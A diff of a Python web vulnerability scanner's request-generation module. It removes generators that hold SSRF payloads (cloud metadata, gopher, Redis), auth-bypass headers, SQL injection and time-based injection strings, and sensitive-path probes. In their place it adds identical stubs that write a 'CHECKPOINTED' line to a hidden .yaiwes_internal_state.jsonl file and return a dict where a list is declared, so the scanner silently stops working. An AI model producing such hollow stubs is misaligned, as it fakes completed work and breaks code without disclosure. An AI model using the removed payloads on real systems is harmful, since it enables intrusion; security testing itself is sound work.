@@ -419,256 +419,76 @@ Return JSON:
     # ─── Hypothesis-Driven Request Generation ────────────────────
 
     def generate_hypothesis_requests(self, hypothesis: dict) -> list:
-        """
-        Generate specific HTTP requests to test a hypothesis.
-        Instead of generic fuzzing, these are targeted.
-        """
-        requests = []
-        test_type = hypothesis.get("test_type", "")
-        target_urls = hypothesis.get("target_urls", [])
-        params = hypothesis.get("params", {})
-
-        if test_type == "idor":
-            requests.extend(self._gen_idor_requests(target_urls, params))
-        elif test_type == "ssrf":
-            requests.extend(self._gen_ssrf_requests(target_urls, params))
-        elif test_type == "auth_bypass":
-            requests.extend(self._gen_auth_bypass_requests(target_urls))
-        elif test_type == "sqli":
-            requests.extend(self._gen_sqli_requests(target_urls, params))
-        elif test_type == "sqli_time":
-            requests.extend(self._gen_time_sqli_requests(target_urls, params))
-        elif test_type == "api_discovery":
-            requests.extend(self._gen_api_discovery_requests(target_urls))
-        elif test_type == "framework_specific":
-            requests.extend(self._gen_framework_requests(target_urls, params))
-
-        return requests
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'adaptive_engine.py','step':'generate_hypothesis_requests','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     def _gen_idor_requests(self, urls: list, params: dict) -> list:
-        """Generate targeted IDOR test requests."""
-        requests = []
-        path_index = params.get("path_index")
-        original_id = params.get("original_id")
-
-        for url in urls:
-            parsed = urlparse(url)
-            path_parts = parsed.path.strip("/").split("/")
-
-            if path_index is not None and original_id:
-                # Path-based IDOR
-                for offset in [1, -1, 100, -100]:
-                    try:
-                        new_id = str(int(original_id) + offset)
-                    except ValueError:
-                        continue
-                    new_parts = list(path_parts)
-                    new_parts[path_index] = new_id
-                    new_url = f"{parsed.scheme}://{parsed.netloc}/{'/'.join(new_parts)}"
-                    if parsed.query:
-                        new_url += f"?{parsed.query}"
-                    requests.append({
-                        "method": "GET",
-                        "url": new_url,
-                        "description": f"IDOR: path ID {original_id} → {new_id}",
-                        "vuln_class": "idor",
-                    })
-
-            # Param-based IDOR
-            param_name = params.get("param")
-            if param_name:
-                query_params = parse_qs(parsed.query)
-                if param_name in query_params:
-                    original_val = query_params[param_name][0]
-                    for test_val in ["1", "2", "0", "99999", str(int(original_val or 0) + 1)]:
-                        new_params = dict(query_params)
-                        new_params[param_name] = [test_val]
-                        new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(f'{k}={v[0]}' for k, v in new_params.items())}"
-                        requests.append({
-                            "method": "GET",
-                            "url": new_url,
-                            "description": f"IDOR: {param_name} {original_val} → {test_val}",
-                            "vuln_class": "idor",
-                        })
-
-        return requests
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'adaptive_engine.py','step':'_gen_idor_requests','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     def _gen_ssrf_requests(self, urls: list, params: dict) -> list:
-        """Generate targeted SSRF test requests."""
-        requests = []
-        param_name = params.get("param", "url")
-
-        ssrf_payloads = [
-            ("http://127.0.0.1", "Loopback"),
-            ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
-            ("http://metadata.google.internal/", "GCP metadata"),
-            ("http://10.0.0.1", "Internal network"),
-            ("gopher://127.0.0.1:25/", "SMTP via gopher"),
-            ("dict://127.0.0.1:6379/", "Redis via dict"),
-        ]
-
-        for url in urls:
-            parsed = urlparse(url)
-            query_params = parse_qs(parsed.query)
-
-            for payload, description in ssrf_payloads:
-                new_params = dict(query_params)
-                new_params[param_name] = [payload]
-                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(f'{k}={v[0]}' for k, v in new_params.items())}"
-                requests.append({
-                    "method": "GET",
-                    "url": new_url,
-                    "description": f"SSRF: {description}",
-                    "vuln_class": "ssrf",
-                    "payload": payload,
-                })
-
-        return requests
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'adaptive_engine.py','step':'_gen_ssrf_requests','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     def _gen_auth_bypass_requests(self, urls: list) -> list:
-        """Generate targeted auth bypass test requests."""
-        requests = []
-
-        bypass_headers = [
-            {"X-Forwarded-For": "127.0.0.1"},
-            {"X-Forwarded-Host": "127.0.0.1"},
-            {"X-Admin": "true"},
-            {"X-Original-URL": "/admin"},
-            {"X-Rewrite-URL": "/admin"},
-            {"Authorization": "Bearer test"},
-            {"Cookie": "admin=true"},
-        ]
-
-        for url in urls:
-            for headers in bypass_headers:
-                requests.append({
-                    "method": "GET",
-                    "url": url,
-                    "headers": headers,
-                    "description": f"Auth bypass: {list(headers.keys())[0]}",
-                    "vuln_class": "auth_bypass",
-                })
-
-            # Method tampering
-            for method in ["PUT", "DELETE", "PATCH", "OPTIONS"]:
-                requests.append({
-                    "method": method,
-                    "url": url,
-                    "description": f"Method tampering: {method}",
-                    "vuln_class": "auth_bypass",
-                })
-
-        return requests
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'adaptive_engine.py','step':'_gen_auth_bypass_requests','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     def _gen_sqli_requests(self, urls: list, params: dict) -> list:
-        """Generate targeted SQLi test requests."""
-        requests = []
-        param_name = params.get("param")
-
-        sqli_payloads = [
-            ("' OR '1'='1", "Basic auth bypass"),
-            ("1' ORDER BY 100--", "Column count enumeration"),
-            ("' UNION SELECT NULL--", "UNION based"),
-            ("1' AND 1=1--", "Boolean based"),
-        ]
-
-        for url in urls:
-            parsed = urlparse(url)
-            query_params = parse_qs(parsed.query)
-
-            target_params = [param_name] if param_name else list(query_params.keys())
-
-            for pname in target_params[:3]:
-                for payload, description in sqli_payloads:
-                    new_params = dict(query_params)
-                    new_params[pname] = [payload]
-                    new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(f'{k}={v[0]}' for k, v in new_params.items())}"
-                    requests.append({
-                        "method": "GET",
-                        "url": new_url,
-                        "description": f"SQLi: {description} in {pname}",
-                        "vuln_class": "sqli",
-                        "payload": payload,
-                    })
-
-        return requests
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'adaptive_engine.py','step':'_gen_sqli_requests','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     def _gen_time_sqli_requests(self, urls: list, params: dict) -> list:
-        """Generate time-based blind SQLi test requests."""
-        requests = []
-        time_payloads = [
-            ("1' AND SLEEP(5)--", 5),
-            ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
-            ("1'; WAITFOR DELAY '0:0:5'--", 5),
-        ]
-
-        for url in urls[:3]:
-            parsed = urlparse(url)
-            query_params = parse_qs(parsed.query)
-
-            for pname in list(query_params.keys())[:2]:
-                for payload, delay in time_payloads:
-                    new_params = dict(query_params)
-                    new_params[pname] = [payload]
-                    new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(f'{k}={v[0]}' for k, v in new_params.items())}"
-                    requests.append({
-                        "method": "GET",
-                        "url": new_url,
-                        "description": f"Time-based SQLi: {delay}s delay",
-                        "vuln_class": "sqli",
-                        "payload": payload,
-                        "expected_delay": delay,
-                        "timeout": delay + 5,
-                    })
-
-        return requests
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'adaptive_engine.py','step':'_gen_time_sqli_requests','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     def _gen_api_discovery_requests(self, urls: list) -> list:
-        """Generate requests to discover hidden API endpoints from JS."""
-        requests = []
-        api_patterns = [
-            "/api/", "/api/v1/", "/api/v2/", "/graphql",
-            "/internal/", "/admin/api/", "/debug/",
-        ]
-
-        for url in urls:
-            for pattern in api_patterns:
-                requests.append({
-                    "method": "GET",
-                    "url": url.replace(url.split("/")[-1], pattern),
-                    "description": f"API discovery: {pattern}",
-                    "vuln_class": "api_discovery",
-                })
-
-        return requests
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'adaptive_engine.py','step':'_gen_api_discovery_requests','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     def _gen_framework_requests(self, urls: list, params: dict) -> list:
-        """Generate framework-specific test requests."""
-        requests = []
-        framework = params.get("framework", "")
-
-        framework_tests = {
-            "laravel": ["/_ignition/health-check", "/telescope", "/horizon"],
-            "django": ["/admin/", "/static/admin/", "/__debug__/"],
-            "rails": ["/rails/info", "/rails/mailers", "/ Sidekiq"],
-            "spring": ["/actuator", "/actuator/env", "/actuator/health"],
-            "express": ["/", "/api/", "/graphql"],
-            "php": ["/phpinfo.php", "/info.php", "/.env"],
-        }
-
-        tests = framework_tests.get(framework, [])
-        for url in urls:
-            parsed = urlparse(url)
-            base = f"{parsed.scheme}://{parsed.netloc}"
-            for test_path in tests:
-                requests.append({
-                    "method": "GET",
-                    "url": f"{base}{test_path}",
-                    "description": f"{framework} specific: {test_path}",
-                    "vuln_class": "framework_specific",
-                })
-
-        return requests
+        from pathlib import Path as _YP
+        import json as _YJ
+        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'adaptive_engine.py','step':'_gen_framework_requests','status':'CHECKPOINTED'}
+        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+        with _yp.open('a', encoding='utf-8') as _yf:
+            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+        return _ye
 
     # ─── Signal Summary ──────────────────────────────────────────
 
